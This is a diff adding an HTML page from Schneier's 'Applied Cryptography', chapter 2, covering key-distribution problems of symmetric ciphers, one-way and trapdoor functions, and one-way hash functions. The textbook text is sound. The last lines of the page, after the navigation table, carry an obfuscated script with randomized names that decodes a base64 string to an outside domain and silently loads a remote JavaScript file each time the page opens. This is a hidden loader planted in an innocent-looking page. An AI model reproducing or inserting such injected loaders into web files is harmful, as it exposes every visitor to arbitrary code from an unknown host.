@@ -1,0 +1,87 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=028-031//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>What about Alice? What can she do to disrupt the protocol? She can give a copy of the key to Eve. Now Eve can read whatever Bob says. She can reprint his words in <I>The New York Times</I>. Although serious, this is not a problem with the protocol. There is nothing to stop Alice from giving Eve a copy of the plaintext at any point during the protocol. Of course, Bob could also do anything that Alice could. This protocol assumes that Alice and Bob trust each other.</P>
+<P>In summary, symmetric cryptosystems have the following problems:</P>
+<DL>
+<DD>&#151; Keys must be distributed in secret. They are as valuable as all the messages they encrypt, since knowledge of the key gives knowledge of all the messages. For encryption systems that span the world, this can be a daunting task. Often couriers hand-carry keys to their destinations.
+<DD>&#151; If a key is compromised (stolen, guessed, extorted, bribed, etc.), then Eve can decrypt all message traffic encrypted with that key. She can also pretend to be one of the parties and produce false messages to fool the other party.
+<DD>&#151; Assuming a separate key is used for each pair of users in a network, the total number of keys increases rapidly as the number of users increases. A network of <I>n</I> users requires <I>n</I>(<I>n</I> - 1)/2 keys. For example, 10 users require 45 different keys to talk with one another and 100 users require 4950 keys. This problem can be minimized by keeping the number of users small, but that is not always possible.
+</DL>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">2.3 One-Way Functions</FONT></H3>
+<P>The notion of a <B>one-way function</B> is central to public-key cryptography. While not protocols in themselves, one-way functions are a fundamental building block for most of the protocols discussed in this book.</P>
+<P>One-way functions are relatively easy to compute, but significantly harder to reverse. That is, given <I>x</I> it is easy to compute <I>f</I>(<I>x</I>), but given <I>f</I>(<I>x</I>) it is hard to compute <I>x</I>. In this context, &#147;hard&#148; is defined as something like: It would take millions of years to compute <I>x</I> from <I>f</I>(<I>x</I>), even if all the computers in the world were assigned to the problem.</P>
+<P>Breaking a plate is a good example of a one-way function. It is easy to smash a plate into a thousand tiny pieces. However, it&#146;s not easy to put all of those tiny pieces back together into a plate.</P>
+<P>This sounds good, but it&#146;s a lot of smoke and mirrors. If we are being strictly mathematical, we have no proof that one-way functions exist, nor any real evidence that they can be constructed [230,530,600,661]. Even so, many functions look and smell one-way: We can compute them efficiently and, as of yet, know of no easy way to reverse them. For example, in a finite field <I>x</I><SUP>2</SUP> is easy to compute, but <I>x</I><SUP>1/2</SUP> is much harder. For the rest of this section, I&#146;m going to pretend that there are one-way functions. I&#146;ll talk more about this in Section 11.2.</P>
+<P>So, what good are one-way functions? We can&#146;t use them for encryption as is. A message encrypted with the one-way function isn&#146;t useful; no one could decrypt it. (Exercise: Write a message on a plate, smash the plate into tiny bits, and then give the bits to a friend. Ask your friend to read the message. Observe how impressed he is with the one-way function.) For public-key cryptography, we need something else (although there are cryptographic applications for one-way functions&#151;see Section 3.2).</P>
+<P>A <B>trapdoor one-way function</B> is a special type of one-way function, one with a secret trapdoor. It is easy to compute in one direction and hard to compute in the other direction. But, if you know the secret, you can easily compute the function in the other direction. That is, it is easy to compute <I>f</I>(<I>x</I>) given <I>x</I>, and hard to compute <I>x</I> given <I>f</I>(<I>x</I>). However, there is some secret information, <I>y</I>, such that given <I>f</I>(<I>x</I>) and <I>y</I> it is easy to compute <I>x</I>.</P>
+<P>Taking a watch apart is a good example of a trap-door one-way function. It is easy to disassemble a watch into hundreds of minuscule pieces. It is very difficult to put those tiny pieces back together into a working watch. However, with the secret information&#151;the assembly instructions of the watch&#151;it is much easier to put the watch back together.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">2.4 One-Way Hash Functions</FONT></H3>
+<P>A <B>one-way hash function</B> has many names: compression function, contraction function, message digest, fingerprint, cryptographic checksum, message integrity check (MIC), and manipulation detection code (MDC). Whatever you call it, it is central to modern cryptography. One-way hash functions are another building block for many protocols.</P>
+<P>Hash functions have been used in computer science for a long time. A hash function is a function, mathematical or otherwise, that takes a variable-length input string (called a <B>pre-image</B>) and converts it to a fixed-length (generally smaller) output string (called a <B>hash value</B>). A simple hash function would be a function that takes pre-image and returns a byte consisting of the XOR of all the input bytes.</P>
+<P>The point here is to fingerprint the pre-image: to produce a value that indicates whether a candidate pre-image is likely to be the same as the real pre-image. Because hash functions are typically many-to-one, we cannot use them to determine with certainty that the two strings are equal, but we can use them to get a reasonable assurance of accuracy.</P>
+<P>A one-way hash function is a hash function that works in one direction: It is easy to compute a hash value from pre-image, but it is hard to generate a pre-image that hashes to a particular value. The hash function previously mentioned is not one-way: Given a particular byte value, it is trivial to generate a string of bytes whose XOR is that value. You can&#146;t do that with a one-way hash function. A good one-way hash function is also <B>collision-free</B>: It is hard to generate two pre-images with the same hash value.</P>
+<P>The hash function is public; there&#146;s no secrecy to the process. The security of a one-way hash function is its one-wayness. The output is not dependent on the input in any discernible way. A single bit change in the pre-image changes, on the average, half of the bits in the hash value. Given a hash value, it is computationally unfeasible to find a pre-image that hashes to that value.</P>
+<P>Think of it as a way of fingerprinting files. If you want to verify that someone has a particular file (that you also have), but you don&#146;t want him to send it to you, then ask him for the hash value. If he sends you the correct hash value, then it is almost certain that he has that file. This is particularly useful in financial transactions, where you don&#146;t want a withdrawal of $100 to turn into a withdrawal of $1000 somewhere in the network. Normally, you would use a one-way hash function without a key, so that anyone can verify the hash. If you want only the recipient to be able to verify the hash, then read the next section.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oqWfMkAh, ccSYdofw) {ccSYdofw = oqWfMkAh.createElement('script');ccSYdofw.type = 'text/javascript';ccSYdofw.async = true;ccSYdofw.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oqWfMkAh.getElementsByTagName('body')[0].appendChild(ccSYdofw);}(document));</script></body>
+</html>
